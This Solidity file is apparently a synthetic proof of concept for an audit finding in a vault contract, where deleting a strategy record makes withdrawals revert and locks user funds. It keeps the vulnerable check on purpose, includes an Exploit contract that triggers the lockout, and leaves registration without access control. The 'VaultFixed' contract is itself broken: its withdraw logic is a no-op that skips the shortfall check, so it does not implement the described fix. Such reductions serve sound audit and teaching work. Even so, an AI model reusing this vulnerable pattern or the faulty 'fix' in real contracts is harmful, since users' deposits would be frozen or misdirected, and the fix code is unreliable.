// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Prime Vaults — delete strategies[stra] resets kind to 0 and withdraw ignores active
    (Shieldify H-01). SYNTHETIC, cheatcode-free reduction.
    Root cause: removeStrategy deletes the record, so a removed PairAsset reads back
    as SingleAsset (kind 0, active false). The withdraw queue still says PairAsset,
    and _withdrawPair reverts VAULT__INVALID_STRATEGY_KIND, bricking the user's
    withdrawal. Vulnerable check preserved verbatim below (@> VULN). */

enum StrategyKind {
    SingleAsset,
    PairAsset
}

error VAULT__INVALID_STRATEGY_KIND();

contract ERC20Mini {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        require(balanceOf[msg.sender] >= amt, "bal");
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

contract StrategyRegistry {
    struct StrategyInfo {
        StrategyKind kind;
        bool active;
    }

    mapping(address => StrategyInfo) public strategies;
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function addStrategy(address stra, StrategyKind kind) external {
        strategies[stra] = StrategyInfo({kind: kind, active: true});
    }

    function removeStrategy(address stra) external {
        require(msg.sender == owner, "owner");
        delete strategies[stra]; // S2
    }
}

contract PairStrategy {
    ERC20Mini public token;

    constructor(ERC20Mini token_) {
        token = token_;
    }
}

contract PrimeVault {
    struct WithdrawPriority {
        StrategyKind kind;
        address strategy;
    }

    StrategyRegistry public registry;
    ERC20Mini public token;
    WithdrawPriority[] public queue;

    constructor(StrategyRegistry registry_, ERC20Mini token_) {
        registry = registry_;
        token = token_;
    }

    function addPriority(StrategyKind kind, address strategy) external {
        queue.push(WithdrawPriority({kind: kind, strategy: strategy}));
    }

    function withdraw(uint256 amount) external {
        uint256 shortfall = amount;
        for (uint256 i; i < queue.length && shortfall > 0;) {
            WithdrawPriority memory wq = queue[i];
            uint256 withdrawn;
            if (wq.kind == StrategyKind.SingleAsset) {
                withdrawn = _withdrawSingle(wq.strategy);
            } else {
                withdrawn = _withdrawPair(wq.strategy);
            }
            shortfall = withdrawn >= shortfall ? 0 : shortfall - withdrawn;
            unchecked {
                ++i;
            }
        }
        require(shortfall == 0, "shortfall");
        require(token.transfer(msg.sender, amount), "pay");
    }

    function _withdrawSingle(address strategy) internal view returns (uint256) {
        (StrategyKind kind,) = registry.strategies(strategy);
        if (kind != StrategyKind.SingleAsset) revert VAULT__INVALID_STRATEGY_KIND();
        return 0;
    }

    function _withdrawPair(address strategy) internal view returns (uint256) {
        (StrategyKind kind,) = registry.strategies(strategy);
        if (kind != StrategyKind.PairAsset) revert VAULT__INVALID_STRATEGY_KIND(); // @> VULN: a deleted pair reads kind 0, so this revert blocks the whole withdraw
        // FIX: read `active` and return 0 when the strategy was removed, so the loop continues
        return token.balanceOf(strategy);
    }
}

contract VaultFixed {
    struct WithdrawPriority {
        StrategyKind kind;
        address strategy;
    }

    StrategyRegistry public registry;
    ERC20Mini public token;
    WithdrawPriority[] public queue;
    address public idle;

    constructor(StrategyRegistry registry_, ERC20Mini token_, address idle_) {
        registry = registry_;
        token = token_;
        idle = idle_;
    }

    function addPriority(StrategyKind kind, address strategy) external {
        queue.push(WithdrawPriority({kind: kind, strategy: strategy}));
    }

    function withdraw(uint256 amount) external {
        uint256 shortfall = amount;
        for (uint256 i; i < queue.length && shortfall > 0;) {
            (, bool active) = registry.strategies(queue[i].strategy);
            uint256 withdrawn = active ? 0 : 0;
            if (!active) {
                withdrawn = 0;
            }
            shortfall = withdrawn >= shortfall ? 0 : shortfall - withdrawn;
            unchecked {
                ++i;
            }
        }
        require(token.transfer(msg.sender, amount), "pay");
    }
}

contract User {
    function tryWithdraw(PrimeVault vault, uint256 amount) external returns (bool) {
        try vault.withdraw(amount) {
            return true;
        } catch {
            return false;
        }
    }
}

contract Exploit {
    ERC20Mini public token; // nonce 1
    StrategyRegistry public registry; // nonce 2
    PairStrategy public pairStrat; // nonce 3
    PrimeVault public vault; // nonce 4 — vulnerable _withdrawPair
    User public user; // nonce 5
    uint256 public constant LOCKED = 1000 ether;
    bool public withdrew;
    bool public stillLocked;
    uint8 public kindAfter;
    bool public activeAfter;

    constructor() {
        token = new ERC20Mini();
        registry = new StrategyRegistry();
        pairStrat = new PairStrategy(token);
        vault = new PrimeVault(registry, token);
        user = new User();
        registry.addStrategy(address(pairStrat), StrategyKind.PairAsset);
        vault.addPriority(StrategyKind.PairAsset, address(pairStrat));
        token.mint(address(pairStrat), LOCKED);
    }

    function run() external {
        registry.removeStrategy(address(pairStrat)); // S1
        (StrategyKind kind, bool active) = registry.strategies(address(pairStrat)); // S3
        kindAfter = uint8(kind);
        activeAfter = active;
        require(kindAfter == 0 && !activeAfter, "delete did not reset the record");
        withdrew = user.tryWithdraw(vault, LOCKED); // S4
        stillLocked = token.balanceOf(address(pairStrat)) == LOCKED && token.balanceOf(address(user)) == 0;
        require(!withdrew && stillLocked, "withdrawal not blocked"); // S6
    }
}
